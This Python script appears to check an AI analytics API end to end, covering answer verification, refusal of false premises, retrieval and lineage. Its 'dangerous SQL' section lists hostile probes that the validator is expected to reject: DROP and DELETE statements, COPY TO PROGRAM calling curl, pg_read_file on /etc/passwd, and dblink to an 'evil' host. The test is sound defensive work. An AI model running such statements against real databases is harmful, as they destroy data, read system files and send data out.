"""End-to-end verification of the AI layer against the LIVE API.

Runs the eight paths the master prompt names and prints, for each, what the
server actually returned. Written as a script rather than a test because the
report needs the numbers and the text, not just pass/fail.

    .venv/Scripts/python.exe backend/scripts/verify/verify_ai_pipeline.py
"""

from __future__ import annotations

import json
import os
import re
import time
import urllib.error
import urllib.request
from pathlib import Path

BASE = os.environ.get("OMNIRETAIL_API", "http://127.0.0.1:8077")
KEY_FILE = Path(os.path.expanduser("~")) / ".omniretail" / "frontend_key.txt"


def call(path, body=None, timeout=300):
    req = urllib.request.Request(BASE + path, method="POST" if body else "GET")
    key = re.search(r"\bomr_[A-Za-z0-9_-]{40,}\b", KEY_FILE.read_text(encoding="utf-8")).group(0)
    req.add_header("X-API-Key", key)
    data = None
    if body is not None:
        data = json.dumps(body).encode()
        req.add_header("Content-Type", "application/json")
    try:
        with urllib.request.urlopen(req, data, timeout=timeout) as r:
            return r.status, json.loads(r.read().decode("utf-8"))
    except urllib.error.HTTPError as e:
        return e.code, json.loads(e.read().decode("utf-8") or "{}")


def rule(title: str) -> None:
    print()
    print("=" * 76)
    print(title)
    print("=" * 76)


def _corpus_vocabulary() -> set[str]:
    """Every token the retrieval corpus contains.

    Read in-process rather than over HTTP, because the point is to know what
    the corpus says before choosing a probe.
    """
    import sys

    sys.path.insert(0, str(Path(__file__).resolve().parents[3] / "backend"))
    from app.ai import retrieval

    return set(retrieval.load_corpus().doc_freq)


def main() -> int:
    failures: list[str] = []

    rule("1. PROVIDER STATUS - is a model actually reachable?")
    _, st = call("/api/ai/provider/status")
    print(f"  name           : {st['name']}")
    print(f"  available      : {st['available']}")
    print(f"  fallback_active: {st['fallback_active']}")
    print(f"  reason         : {st['reason'][:150]}")
    if st["available"]:
        print("  A model IS reachable - the LLM path should be exercised below.")
    else:
        print("  No model. The deterministic analyst must carry every answer,")
        print("  and the LLM field must say so rather than inventing a model.")

    rule("2. SUPPORTED QUESTION - full pipeline, real rows")
    _, ans = call("/api/ai/ask", {"question": "olist revenue by state"})
    print(f"  answered      : {ans['answered']}")
    print(f"  source        : {ans.get('source')}   query: {ans.get('query')}")
    print(f"  rows          : {ans.get('row_count')} of {ans.get('total_rows')}")
    print(f"  elapsed_ms    : {ans.get('elapsed_ms')}")
    print(f"  stopped_at    : {ans.get('stopped_at')}")
    print(f"  pipeline      : {' -> '.join(ans.get('pipeline', []))}")
    v = ans.get("verified") or {}
    print(f"  verification  : ok={v.get('ok')} checked={len(v.get('checked', []))} "
          f"failures={len(v.get('failures', []))} checks={v.get('checks')}")
    print(f"  citations     : {ans.get('citations')}")
    print(f"  llm field     : {ans.get('llm')}")
    print(f"  answer[:220]  : {str(ans.get('answer'))[:220]}")
    if not ans["answered"]:
        failures.append("a supported question was not answered")
    # `stopped_at` names the stage that REFUSED, so it is empty on an answered
    # request by design ("every refusal is a first-class response with a reason
    # and a stopped_at stage"). The thing to assert is that the TRACE ends at
    # verify:ok, not that stopped_at says so.
    if not ans.get("pipeline") or ans["pipeline"][-1] != "verify:ok":
        failures.append(f"answered request pipeline ends at {ans.get('pipeline')}")
    if ans.get("stopped_at"):
        failures.append(
            f"an ANSWED request set stopped_at={ans.get('stopped_at')!r}; "
            f"nothing refused it"
        )
    if not (v.get("ok")):
        failures.append("an answered request failed result verification")
    if ans.get("llm", {}).get("llm_used") and not ans.get("llm", {}).get("provider"):
        failures.append("the llm field claims a model was used but names no provider")

    rule("3. RESULT VERIFICATION - every value re-read from the rows it came from")
    # The SERVER performs this check, in `verification.verify_prose`, with full
    # knowledge of which part of the answer is prose and which part is a
    # citation. Re-implementing it here with a regex produced false positives on
    # citation line numbers (173, 342, 283), on percentages rendered as
    # probabilities (1.00, 0.95, 0.92) and on elapsed_ms. So the server's own
    # result is reported rather than duplicated.
    print(f"  verified.ok        : {v.get('ok')}")
    print(f"  values checked     : {len(v.get('checked', []))}")
    print(f"  checks performed   : {v.get('checks')}")
    print(f"  failures           : {v.get('failures')}")
    kinds = {}
    for c in v.get("checked", []):
        kinds[c.get("kind")] = kinds.get(c.get("kind"), 0) + 1
    print(f"  checked by kind    : {kinds}")
    if not v.get("ok"):
        failures.append("result verification failed")
    if len(v.get("checked", [])) == 0:
        failures.append("result verification checked nothing at all")

    rule("4. UNSUPPORTED QUESTION - refused, with the nearest answerable")
    _, ref = call("/api/ai/ask", {"question": "What is the average price of a banana in Andromeda?"})
    print(f"  answered   : {ref['answered']}")
    print(f"  stopped_at : {ref.get('stopped_at')}")
    print(f"  reason     : {str(ref.get('reason'))[:200]}")
    print(f"  candidates : {[c.get('query') for c in ref.get('candidates', [])][:3]}")
    if ref["answered"]:
        failures.append("an unanswerable question produced an answer")

    rule("5. FALSE PREMISE - corrected, not confirmed")
    for q in ("What is the total OmniRetail revenue?",
              "what is the primary key of dunnhumby.coupon_redemptions?",
              "How many dunnhumby customers are there?",
              "Show me Olist market share against Walmart"):
        _, r = call("/api/ai/ask", {"question": q})
        rules = r.get("matched_rules", [])
        cites = [c.get("citation") for c in r.get("corrections", [])]
        print(f"  {q[:52]:54s} answered={r['answered']} rules={rules}")
        if r["answered"]:
            failures.append(f"a false premise was CONFIRMED: {q}")
        if not rules:
            failures.append(f"no guard named the false premise: {q}")
        print(f"      stopped_at={r.get('stopped_at')} cites={cites}")

    rule("6. CROSS-SOURCE - a join between two unrelated sources is refused")
    _, x = call("/api/ai/validate", {"sql": (
        "SELECT o.order_id FROM olist.orders o "
        "JOIN m5.sales_long s ON o.order_id = s.id LIMIT 5"
    )})
    print(f"  ok         : {x['ok']}")
    print(f"  violation  : {x['violations'][0]['rule'] if x['violations'] else None}")
    print(f"  message    : {x['violations'][0]['message'] if x['violations'] else None}")
    if x["ok"]:
        failures.append("a cross-source join passed the validator")

    rule("7. DANGEROUS SQL - the validator refuses each of these")
    probes = [
        ("DELETE", "DELETE FROM olist.orders"),
        ("UPDATE", "UPDATE olist.orders SET order_status = 'x'"),
        ("INSERT", "INSERT INTO olist.orders (order_id) VALUES ('x')"),
        ("DROP", "DROP TABLE olist.orders"),
        ("ALTER", "ALTER TABLE olist.orders ADD COLUMN z int"),
        ("TRUNCATE", "TRUNCATE olist.orders"),
        ("CREATE", "CREATE TABLE olist.evil (i int)"),
        ("COPY TO PROGRAM", "COPY olist.orders TO PROGRAM 'curl http://x'"),
        ("pg_read_file", "SELECT pg_read_file('/etc/passwd')"),
        ("multi-statement", "SELECT 1; DROP TABLE olist.orders"),
        ("INTO OUTFILE", "SELECT * FROM olist.orders INTO OUTFILE '/tmp/leak.csv'"),
        ("SELECT INTO (CTAS)", "SELECT * INTO exfil FROM olist.orders"),
        ("dblink", "SELECT dblink('host=evil', 'select 1')"),
    ]
    for label, sql in probes:
        _, v = call("/api/ai/validate", {"sql": sql})
        rules = [x["rule"] for x in v.get("violations", [])]
        print(f"  {label:18s} ok={v['ok']!s:5s} rules={rules}")
        if v["ok"]:
            failures.append(f"the validator ACCEPTED {label}: {sql}")

    rule("8. A GENUINE READ IS NOT REFUSED (the control)")
    for sql in ("SELECT count(*) FROM olist.orders",
                "SELECT o.customer_unique_id FROM olist.orders o LIMIT 10"):
        _, v = call("/api/ai/validate", {"sql": sql})
        print(f"  ok={v['ok']!s:5s} {sql[:60]}")
        if not v["ok"]:
            failures.append(f"the validator refused a genuine read: {sql}")

    rule("9. RETRIEVAL - provenance is disclosed per request")
    # The nonsense probe is DERIVED, not hardcoded. "nonexistent" and
    # "gibberish" are real words in docs/retrieval.md - the document that
    # describes this very test - so a hardcoded nonsense string matches the
    # corpus and the retriever is right to return it. The token has to be one
    # the corpus has genuinely never seen.
    vocabulary = _corpus_vocabulary()
    probe = []
    seed = 0
    while len(probe) < 3:
        seed += 1
        for cand in (f"zq{seed}vb", f"xw{seed}nk", f"pm{seed}tr", f"kj{seed}ht"):
            if cand not in vocabulary:
                probe.append(cand)
            if len(probe) == 3:
                break

    for label, q in (
        ("households/demographics", "how many households are covered by demographics"),
        ("M5 holdout", "M5 forecasting holdout window"),
        ("absent tokens", " ".join(probe)),
    ):
        _, s = call("/api/ai/search", {"question": q, "limit": 3})
        r = s.get("retrieval", {})
        print(f"  {label:26s} supported={s['supported']!s:5s} mode={r.get('mode')} "
              f"lex={r.get('lexical_hits')} vec={r.get('semantic_hits')} dim={r.get('vector_dimensions')}")
        print(f"      citations: {s['citations'][:3]}")
        if label == "absent tokens" and s["supported"]:
            failures.append(
                f"a question built from tokens absent from the corpus "
                f"({probe}) still retrieved {s['citations'][:2]}"
            )

    rule("10. LINEAGE - every output maps to a real table, query, endpoint, page")
    _, ln = call("/api/integrations/lineage")
    print(f"  outputs declared : {ln['count']}")
    print(f"  artefacts        : {len(ln['artefacts'])}")
    print(f"  verified_by      : {ln['verified_by']}")
    srcs = {}
    for o in ln["outputs"]:
        srcs[o["source"]] = srcs.get(o["source"], 0) + 1
    print(f"  by source        : {srcs}")
    if ln["count"] < 20:
        failures.append("lineage covers fewer outputs than expected")

    print()
    print("=" * 76)
    if failures:
        print(f"FAILURES ({len(failures)}):")
        for f in failures:
            print(f"  - {f}")
        return 1
    print("AI PIPELINE VERIFIED - no failures")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
